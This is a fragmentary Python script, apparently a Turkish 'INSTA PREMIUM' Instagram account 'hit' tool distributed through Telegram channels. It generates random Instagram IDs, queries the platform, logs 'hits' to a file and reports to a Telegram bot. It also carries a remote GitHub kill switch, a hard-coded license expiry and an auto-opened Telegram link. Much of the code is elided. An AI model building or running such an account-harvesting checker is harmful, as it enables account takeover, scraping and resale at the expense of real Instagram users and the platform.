...
m="~ THIS ENCODED BY GLOBAL TOOL | @Globalinx ~";R="\033[0m"
C=["\033[91m","\033[93m","\033[92m","\033[96m","\033[94m","\033[95m"]
x=c//2-len(m)//2;i=0
for _ in range(r):
    sys.stdout.write(f"{' '*x}{C[i%6]}{m}{R}\n");i+=1
    sys.stdout.write(f"{' '*x}{C[i%6]}{m}{R}\n");i+=1
    sys.stdout.flush();time.sleep(.08)
time.sleep(.2);os.system("clear" if os.name!="nt" else "cls")
# ========== AÇ/KAPAT KONTROL SİSTEMİ EKLENDİ ==========
import requests

def sistem_kontrol():
    """GitHub'daki takip.txt dosyasını kontrol eder"""
    try:
        # GitHub'daki takip.txt dosyasının ham URL'si
        url = "https://raw.githubusercontent.com/liris0919/sistem-kontrol/main/takip.txt"
        
        response = requests.get(url, timeout=5)
        
        if response.status_code == 200:
            durum = response.text.strip().lower()
            print(f"\033[1;36m[ SİSTEM KONTROL ] takip.txt: '{durum}'\033[0m")
            
            if durum == "kapali":
                print("\033[1;31m" + "="*60)
                print("🔴 SİSTEM KAPALI! takip.txt'de 'kapali' yazıyor.")
                print("Çalışması için 'acik' yapın.")
                print("="*60 + "\033[0m")
                return False
            elif durum == "acik":
                print("\033[1;32m" + "="*60)
                print("🟢 SİSTEM AÇIK! takip.txt'de 'acik' yazıyor.")
                print("="*60 + "\033[0m")
                return True
            else:
                print("\033[1;33m" + "="*60)
                print(f"⚠️  UYARI: takip.txt içeriği '{durum}' - Sadece 'acik' veya 'kapali' kabul edilir!")
                print("Varsayılan olarak ÇALIŞIYOR sayılıyor.")
                print("="*60 + "\033[0m")
                return True
        else:
            print("\033[1;33m" + "="*60)
            print(f"⚠️  takip.txt okunamadı (HTTP {response.status_code})")
            print("Varsayılan olarak ÇALIŞIYOR sayılıyor.")
            print("="*60 + "\033[0m")
            return True
        ...
        print("\033[1;33m" + "="*60)
        print(f"⚠️  GitHub bağlantı hatası: {e}")
        print("Varsayılan olarak ÇALIŞIYOR sayılıyor.")
        print("="*60 + "\033[0m")
        return True

# Sistemi kontrol et, kapalıysa durdur
if not sistem_kontrol():
    print("\033[1;31mSistem kapalı olduğu için program sonlandırılıyor...\033[0m")
    sys.exit(0)
else:
    print("\033[1;32mSistem açık, programa devam ediliyor...\033[0m\n")
    time.sleep(2)

# ========== AÇ/KAPAT KONTROLÜ BİTTİ ==========
...
def sure(vip):
    response = requests.get("https://canlisaat.com/")
    surea= datetime.now()  
    sureb = datetime.strptime(vip, "%d-%m-%Y:%H:%M")
    
    if surea>= sureb:
        print("\x1b[1;32mApi Durduruldu ⛔\x1b[1;0m | \x1b[1;36mSatın Alım İçin ;\x1b[1;0m @LyroxPy")
        exit()

sure("14-02-2029:23:59")
...
import webbrowser
webbrowser.open("https://t.me/+HbjtRxuwix5jOTQ8")
init(autoreset=True)
...
Lyrox_Logo = cfonts.render('{ INSTA PREMİUM }', colors=['white', 'yellow'], align='center')
print(f'''\n
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓   
     
                      {Lyrox_Logo}
      ~ Programmer : @Globalinx | Channel: @Heads ~
...
os.system('clear')
try:
    requests.post(f"""https://api.telegram.org/bot{TOKEN}/sendvideo?chat_id={ID}&parse_mode=Markdown""")
except Exception:
    pass 
...
VİP
 ...
 ___________________________________
{Y}   [ 1 ] 𝐇𝐢𝐭 𝐃𝐮̈𝐬̧𝐭𝐮̈ : [ {hits} ]
{S}   [ 2 ] 𝐊𝐨̈𝐭𝐮̈ 𝐄𝐦𝐚𝐢𝐥 : [ {good_ig} ]
{K}   [ 3 ] 𝐊𝐨̈𝐭𝐮̈ 𝐈̇𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦 :  [ {bad_insta} ]
{M}     @Haeders ~ @Globalinx {reset} [ {S} VIP {reset}]{M}
...
🇹🇷 𝐑𝐞𝐬𝐞𝐭 | {rest(username)}
𒋨────━𓆩 T O O L S 𓆪‏━────𒋨
Dev. Telegram - [ @Globalinx ]
"""
    with open('@Globalinx [ VİP ] Hits.txt', 'a') as f:
        f.write(info_text + "\n")
    try:
    ...
    while True:
        data = {
            ...
            'variables': json.dumps({
                'id': int(random.randrange(6345108210, 10016232396)),
...
De="Decode Eden Orusbu Çoçuğudur"
#Developer ; @LyroxPy & @LyroxHacks
Decoding=False
